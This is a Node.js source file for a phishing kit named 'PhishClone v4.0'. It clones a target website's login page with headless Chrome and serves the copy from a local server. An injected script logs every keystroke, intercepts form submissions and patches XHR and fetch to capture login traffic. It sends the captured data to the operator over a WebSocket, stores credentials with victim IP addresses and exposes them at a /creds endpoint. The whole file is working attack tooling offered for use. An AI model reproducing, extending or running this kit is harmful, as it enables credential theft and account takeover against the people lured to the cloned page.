#!/usr/bin/env node
/**
 * phantom-arsenal / PhishClone v4.0 — SPA Support
 * Uses headless Chrome to fully render JS-heavy pages
 * Pure Node.js — no Python needed
 */

import puppeteer from 'puppeteer'
import http from 'http'
import https from 'https'
import net from 'net'
import fs from 'fs'
import path from 'path'
import url from 'url'
import crypto from 'crypto'

const TARGET  = process.argv[2]
const PORT    = await findFreePort(parseInt(process.argv[3] || '8080'))
const WS_PORT = await findFreePort(PORT + 1)

if (!TARGET) {
  console.log('Usage: node phisher_spa.mjs <URL> [port]')
  process.exit(1)
}

const CREDS_FILE = 'captured_creds.json'
const LOG_FILE   = 'keystrokes.log'
const ASSET_MAP  = new Map()  // key -> {data, ct}

// ── helpers ──────────────────────────────────────────────────────────────────
function findFreePort(start) {
  return new Promise(res => {
    const s = net.createServer()
    s.listen(start, () => { const p = s.address().port; s.close(() => res(p)) })
    s.on('error', () => res(findFreePort(start + 1)))
  })
}

function urlKey(u) {
  return crypto.createHash('md5').update(u).digest('hex').slice(0, 12)
}

function fetchBinary(u, timeout = 8000) {
  return new Promise((resolve, reject) => {
    const mod = u.startsWith('https') ? https : http
    const req = mod.get(u, {
      timeout,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0',
        'Accept': '*/*'
      }
    }, res => {
      if ([301,302,303,307,308].includes(res.statusCode) && res.headers.location) {
        const loc = res.headers.location.startsWith('http')
          ? res.headers.location
          : new URL(res.headers.location, u).href
        return fetchBinary(loc, timeout).then(resolve).catch(reject)
      }
      const chunks = []
      res.on('data', c => chunks.push(c))
      res.on('end', () => resolve({ data: Buffer.concat(chunks), ct: res.headers['content-type'] || '' }))
    })
    req.on('error', reject)
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')) })
  })
}

function log(msg) { fs.appendFileSync(LOG_FILE, msg + '\n') }

function saveCredential(ip, data) {
  let creds = []
  try { creds = JSON.parse(fs.readFileSync(CREDS_FILE, 'utf8')) } catch {}
  creds.push({ time: new Date().toISOString(), ip, target: TARGET, credentials: data })
  fs.writeFileSync(CREDS_FILE, JSON.stringify(creds, null, 2))
  console.log('\n\x1b[41m\x1b[97m [CAPTURED] IP=' + ip + ' -> ' + JSON.stringify(data) + ' \x1b[0m\n')
}

// ── Step 1: Render page with headless Chrome ─────────────────────────────────
console.log('\x1b[96m')
console.log('╔══════════════════════════════════════════════╗')
console.log('║   phantom-arsenal — PhishClone v4.0         ║')
console.log('║   SPA Support — Headless Chrome Rendering   ║')
console.log('╚══════════════════════════════════════════════╝')
console.log('\x1b[0m')
console.log('[*] Target  : ' + TARGET)
console.log('[*] Launching headless Chrome...')

const browser = await puppeteer.launch({
  headless: true,
  args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
})

const page = await browser.newPage()
await page.setViewport({ width: 1280, height: 800 })
await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36')

// Intercept all network requests → cache assets locally
const assetUrls = new Set()
await page.setRequestInterception(true)
page.on('request', req => {
  const rt = req.resourceType()
  if (['stylesheet','script','image','font','media'].includes(rt)) {
    assetUrls.add(req.url())
  }
  req.continue()
})

await page.goto(TARGET, { waitUntil: 'networkidle2', timeout: 30000 })

// Wait extra for late JS rendering
await new Promise(r => setTimeout(r, 2000))

const finalUrl  = page.url()
let   renderedHtml = await page.content()

console.log('[+] Page rendered (' + renderedHtml.length + ' bytes)')
console.log('[*] Downloading ' + assetUrls.size + ' assets...')

await browser.close()

// ── Step 2: Download all assets in parallel ──────────────────────────────────
const downloads = [...assetUrls].map(async assetUrl => {
  try {
    const { data, ct } = await fetchBinary(assetUrl)
    const key = urlKey(assetUrl)
    ASSET_MAP.set(key, { data, ct, originalUrl: assetUrl })
    return [assetUrl, key]
  } catch { return null }
})

const results = (await Promise.all(downloads)).filter(Boolean)
console.log('[+] Cached ' + results.length + '/' + assetUrls.size + ' assets')

// Replace asset URLs in HTML with local /asset/key paths
for (const [origUrl, key] of results) {
  renderedHtml = renderedHtml.split(origUrl).join('/asset/' + key)
}

// ── Step 3: Inject harvester script ──────────────────────────────────────────
const harvesterJS = `
<script>
(function(){
  var ws;
  function connectWS(){
    try{
      ws = new WebSocket('ws://' + location.hostname + ':${WS_PORT}');
      ws.onclose = function(){ setTimeout(connectWS, 2000); };
    }catch(e){}
  }
  connectWS();
  function send(type, data){
    if(ws && ws.readyState===1) ws.send(JSON.stringify({type:type,data:data,ts:new Date().toISOString()}));
  }
  document.addEventListener('keyup', function(e){
    var t = e.target;
    send('keystroke', {key:e.key, field:t.name||t.id||t.placeholder||t.type||'?', value:t.value});
  }, true);
  document.addEventListener('submit', function(e){
    e.preventDefault();
    var f = e.target;
    var data = {};
    new FormData(f).forEach(function(v,k){ data[k]=v; });
    send('submit', data);
    fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
      .then(function(){ window.location='${finalUrl}'; });
  }, true);
  // intercept React/Vue/Angular login buttons
  document.addEventListener('click', function(e){
    var el = e.target;
    if(el && (el.type==='submit' || el.tagName==='BUTTON' ||
      el.getAttribute('data-testid')||'').includes('login')){
      var inputs = document.querySelectorAll('input');
      var data = {};
      inputs.forEach(function(i){ if(i.value) data[i.name||i.id||i.type]=i.value; });
      if(Object.keys(data).length) send('click_harvest', data);
    }
  }, true);
  // patch XHR
  var origOpen = XMLHttpRequest.prototype.open;
  var origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(m, u){ this._url=u; return origOpen.apply(this,arguments); };
  XMLHttpRequest.prototype.send = function(body){
    if(body && this._url && (this._url.includes('login')||this._url.includes('auth')||this._url.includes('session'))){
      try{ send('xhr_login', {url:this._url, body:typeof body==='string'?body:String(body)}); }catch(e){}
    }
    return origSend.apply(this,arguments);
  };
  // patch fetch
  var origFetch = window.fetch;
  window.fetch = function(input, init){
    var u = typeof input==='string'?input:(input.url||String(input));
    if(u.includes('login')||u.includes('auth')||u.includes('session')){
      var b = (init&&init.body)||'';
      try{ send('fetch_login', {url:u, body:typeof b==='string'?b:String(b)}); }catch(e){}
    }
    return origFetch.apply(this, arguments);
  };
})();
</script>
</body>`

renderedHtml = renderedHtml.replace(/<\/body>/i, harvesterJS)
if (!renderedHtml.includes('/harvest')) renderedHtml += harvesterJS

// ── Step 4: WebSocket server (raw TCP) ───────────────────────────────────────
import { createServer as createNetServer } from 'net'
import { createHash } from 'crypto'

const wsClients = new Set()

function wsHandshake(sock, data) {
  const match = data.toString().match(/Sec-WebSocket-Key: (.+)/)
  if (!match) return false
  const accept = createHash('sha1')
    .update(match[1].trim() + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11')
    .digest('base64')
  sock.write(
    'HTTP/1.1 101 Switching Protocols\r\n' +
    'Upgrade: websocket\r\nConnection: Upgrade\r\n' +
    'Sec-WebSocket-Accept: ' + accept + '\r\n\r\n'
  )
  return true
}

function wsParseFrame(buf) {
  if (buf.length < 2) return null
  const masked = (buf[1] & 0x80) !== 0
  let len = buf[1] & 0x7F
  let offset = 2
  if (len === 126) { len = buf.readUInt16BE(2); offset = 4 }
  else if (len === 127) { len = Number(buf.readBigUInt64BE(2)); offset = 10 }
  if (buf.length < offset + (masked ? 4 : 0) + len) return null
  let payload
  if (masked) {
    const masks = buf.slice(offset, offset + 4); offset += 4
    payload = Buffer.from(buf.slice(offset, offset + len))
    for (let i = 0; i < payload.length; i++) payload[i] ^= masks[i % 4]
  } else {
    payload = buf.slice(offset, offset + len)
  }
  return payload.toString('utf8')
}

const wsSrv = createNetServer(sock => {
  let handshook = false
  sock.on('data', buf => {
    if (!handshook) {
      handshook = wsHandshake(sock, buf)
      if (handshook) wsClients.add(sock)
      return
    }
    const msg = wsParseFrame(buf)
    if (!msg) return
    try {
      const d = JSON.parse(msg)
      const t = d.type || ''
      if (t === 'keystroke') {
        const line = '[KEY] field=' + (d.data.field||'?') + '  key=' + (d.data.key||'?') + '  val=' + (d.data.value||'')
        console.log('\x1b[93m' + line + '\x1b[0m')
        log(line)
      } else if (['submit','click_harvest','xhr_login','fetch_login'].includes(t)) {
        const line = '[' + t.toUpperCase() + '] ' + JSON.stringify(d.data)
        console.log('\x1b[92m' + line + '\x1b[0m')
        log(line)
      }
    } catch {}
  })
  sock.on('close', () => wsClients.delete(sock))
  sock.on('error', () => wsClients.delete(sock))
})
wsSrv.listen(WS_PORT)

// ── Step 5: HTTP server ───────────────────────────────────────────────────────
import { createServer } from 'http'

const httpSrv = createServer((req, res) => {
  const parsedUrl = new URL(req.url, 'http://localhost')
  const pathname  = parsedUrl.pathname

  if (pathname === '/') {
    const body = Buffer.from(renderedHtml, 'utf8')
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': body.length })
    res.end(body)

  } else if (pathname.startsWith('/asset/')) {
    const key  = pathname.slice(7)
    const item = ASSET_MAP.get(key)
    if (item) {
      res.writeHead(200, { 'Content-Type': item.ct || 'application/octet-stream', 'Cache-Control': 'max-age=86400' })
      res.end(item.data)
    } else {
      res.writeHead(404); res.end()
    }

  } else if (pathname === '/creds') {
    let body = '[]'
    try { body = fs.readFileSync(CREDS_FILE, 'utf8') } catch {}
    res.writeHead(200, { 'Content-Type': 'application/json' })
    res.end(body)

  } else if (pathname === '/harvest' && req.method === 'POST') {
    let body = ''
    req.on('data', c => body += c)
    req.on('end', () => {
      let data
      try { data = JSON.parse(body) } catch { data = Object.fromEntries(new URLSearchParams(body)) }
      const ip = req.socket.remoteAddress || '?'
      saveCredential(ip, data)
      res.writeHead(200, { 'Content-Type': 'application/json' })
      res.end('{"ok":true}')
    })

  } else {
    res.writeHead(404); res.end()
  }
})

httpSrv.listen(PORT, () => {
  console.log('\n[+] WebSocket : ws://0.0.0.0:' + WS_PORT)
  console.log('[+] Phishing  : \x1b[92mhttp://0.0.0.0:' + PORT + '\x1b[0m')
  console.log('[+] Creds     : http://0.0.0.0:' + PORT + '/creds')
  console.log('\x1b[93m[*] Ready — waiting for victims...\x1b[0m\n')
})

process.on('SIGINT', () => {
  console.log('\n\x1b[91m[!] Stopped\x1b[0m')
  try {
    const c = JSON.parse(fs.readFileSync(CREDS_FILE, 'utf8'))
    console.log('[+] Total captured: ' + c.length)
    c.forEach(x => console.log('  > ' + x.time + ' | IP=' + x.ip + ' | ' + JSON.stringify(x.credentials)))
  } catch { console.log('[*] Nothing captured') }
  process.exit(0)
})
